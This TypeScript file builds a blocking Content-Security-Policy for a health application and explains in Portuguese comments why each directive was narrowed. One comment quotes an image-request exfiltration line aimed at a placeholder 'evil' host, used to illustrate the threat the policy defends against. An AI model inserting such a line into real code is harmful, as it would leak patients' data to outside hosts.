/**
 * Content-Security-Policy do Qoro.
 *
 * ===================================================================
 * 2026-09-10 — de Report-Only para BLOQUEANTE (auditoria, item 10)
 * ===================================================================
 * Até aqui a política era servida só em `Content-Security-Policy-Report-Only`
 * com `connect-src 'self' https: wss:` e `img-src ... https:`. Nessa forma ela
 * não impedia absolutamente nada: qualquer script na página podia mandar o
 * prontuário para qualquer host TLS do mundo, e o navegador se limitava a
 * reclamar no console. Para um sistema de saúde, exfiltração é o desfecho que
 * importa — não a execução em si.
 *
 * O que mudou, e a medição que sustenta cada mudança (build isolado deste
 * repositório, `pnpm security:build`, 161 chunks de cliente):
 *
 *  - **Bloqueante.** O cabeçalho passa a ser `Content-Security-Policy`.
 *  - **`'unsafe-eval'` REMOVIDO de script-src.** Varredura dos 161 chunks não
 *    encontrou nenhuma ocorrência de `eval(` nem de `new Function(`. A
 *    permissão existia por precaução, não por necessidade.
 *  - **`connect-src` fechado por origem nomeada.** O cliente só fala com:
 *    a própria origem (inclui o túnel do Sentry, `tunnelRoute: '/monitoring'`),
 *    o projeto Supabase (HTTPS + WSS do Realtime) e o SDK do Facebook usado no
 *    Embedded Signup do WhatsApp. `https:` genérico saiu.
 *  - **`img-src` fechado.** Imagem é canal de exfiltração
 *    (`new Image().src = 'https://evil/?' + dado`). Ficam `'self'`, `data:`,
 *    `blob:` e o Storage do Supabase, que é a única origem externa de imagem
 *    do produto.
 *  - **`frame-src` nomeia os iframes do SDK do Facebook** em vez de depender de
 *    `default-src`.
 *
 * ===================================================================
 * Por que NÃO há nonce (decisão, não esquecimento)
 * ===================================================================
 * `'unsafe-inline'` continua em script-src. Trocá-lo por nonce exigiria gerar o
 * nonce no middleware — e o `matcher` do middleware EXCLUI justamente
 * `/login`, `/reset-password`, `/convite`, `/auth/*` e `/join`, que são as
 * páginas alcançáveis sem sessão. O resultado seria endurecer o interior e
 * deixar a porta da frente como está, parecendo protegido.
 *
 * Além disso, o repositório tem UM único `dangerouslySetInnerHTML` (o script
 * constante de tema em `app/layout.tsx`) e nenhum outro sink de HTML controlado
 * por usuário: não existe hoje um caminho de injeção de `<script>` inline que o
 * nonce fecharia e o React já não fecha. O ganho real estava em `connect-src`,
 * que é o que este commit entrega.
 *
 * Promover a nonce exige: ampliar o matcher sem quebrar o redirect de `/login`,
 * propagar o nonce até o `<script>` de tema e tornar `/` dinâmica. Está
 * registrado com prazo em `scripts/security/risk-register.ts`
 * (`csp-nonce-inline-script`), não dado como feito.
 */

/** Origens do SDK do Facebook (Embedded Signup do WhatsApp). */
const FACEBOOK_SCRIPT = 'https://connect.facebook.net';
const FACEBOOK_CONNECT = ['https://www.facebook.com', 'https://graph.facebook.com'] as const;
const FACEBOOK_FRAME = [
  'https://www.facebook.com',
  'https://web.facebook.com',
  'https://staticxx.facebook.com',
] as const;

/**
 * Vercel Toolbar — SOMENTE em Preview. Em Production a origem continua
 * ausente: o toolbar expõe metadado de deployment para quem usa o sistema.
 */
const VERCEL_LIVE = {
  script: ['https://vercel.live'],
  connect: [
    'https://vercel.live',
    'https://vercel.com',
    'wss://ws-us3.pusher.com',
    'https://sockjs-us3.pusher.com',
  ],
  frame: ['https://vercel.live'],
  img: ['https://vercel.live', 'https://vercel.com'],
  font: ['https://vercel.live', 'https://assets.vercel.com'],
} as const;

/**
 * Deriva as origens do projeto Supabase a partir da URL pública. Realtime usa
 * WebSocket no MESMO host, então `wss:` sai da mesma fonte — nada de host
 * digitado à mão que envelhece quando o projeto muda.
 *
 * URL inválida NÃO derruba o build: a política sai sem a origem do Supabase e
 * o app quebra de forma visível em desenvolvimento, em vez de silenciosamente
 * ganhar um curinga. `src/lib/env.ts` já valida a URL antes disto.
 */
function supabaseOrigins(supabaseUrl: string): { http: string[]; ws: string[] } {
  try {
    const { origin, protocol, host } = new URL(supabaseUrl);
    return { http: [origin], ws: [`${protocol === 'https:' ? 'wss:' : 'ws:'}//${host}`] };
  } catch {
    return { http: [], ws: [] };
  }
}

/**
 * @param vercelEnv `process.env.VERCEL_ENV` — só 'preview' amplia a política.
 * @param supabaseUrl `NEXT_PUBLIC_SUPABASE_URL`. Obrigatório: é a única origem
 *        externa de dado do cliente, e sem ela o app não carrega.
 * @param nodeEnv `process.env.NODE_ENV`. SOMENTE 'development' reintroduz
 *        `'unsafe-eval'`: o React Refresh do `next dev` avalia os módulos com
 *        `eval`, e sem essa exceção o servidor de desenvolvimento não roda. O
 *        build de produção não usa `eval` (medido: 0 ocorrências nos 161
 *        chunks), então a permissão não vaza para o que é publicado. A
 *        comparação é contra a string literal — qualquer outro valor, inclusive
 *        indefinido, cai no lado restrito.
 */
export function buildContentSecurityPolicy(
  vercelEnv: string | undefined,
  supabaseUrl: string,
  nodeEnv?: string | undefined,
): string {
  const preview = vercelEnv === 'preview';
  const development = nodeEnv === 'development';
  const supabase = supabaseOrigins(supabaseUrl);
  const join = (...parts: readonly (readonly string[] | string)[]): string =>
    parts.flat().filter(Boolean).join(' ');

  return [
    "default-src 'self'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "object-src 'none'",
    // 'unsafe-inline' permanece — ver o bloco "Por que NÃO há nonce" acima.
    // 'unsafe-eval' SÓ em `next dev` (React Refresh); nunca no que é publicado.
    `script-src ${join("'self'", "'unsafe-inline'", development ? "'unsafe-eval'" : [], FACEBOOK_SCRIPT, preview ? VERCEL_LIVE.script : [])}`,
    `frame-src ${join("'self'", FACEBOOK_FRAME, preview ? VERCEL_LIVE.frame : [])}`,
    // Next e Tailwind emitem <style> inline; sem nonce, style-src precisa disto.
    // É um risco menor por ordens de grandeza que o mesmo em script-src.
    `style-src ${join("'self'", "'unsafe-inline'", preview ? VERCEL_LIVE.script : [])}`,
    `img-src ${join("'self'", 'data:', 'blob:', supabase.http, preview ? VERCEL_LIVE.img : [])}`,
    `font-src ${join("'self'", 'data:', preview ? VERCEL_LIVE.font : [])}`,
    // O Sentry do browser sai pelo túnel same-origin (/monitoring), então o host
    // de ingestão NÃO entra aqui: seria um destino de exfiltração a mais, e o
    // DSN é público. Se o túnel falhar, perde-se telemetria — não o app.
    `connect-src ${join("'self'", supabase.http, supabase.ws, FACEBOOK_CONNECT, preview ? VERCEL_LIVE.connect : [])}`,
  ].join('; ');
}
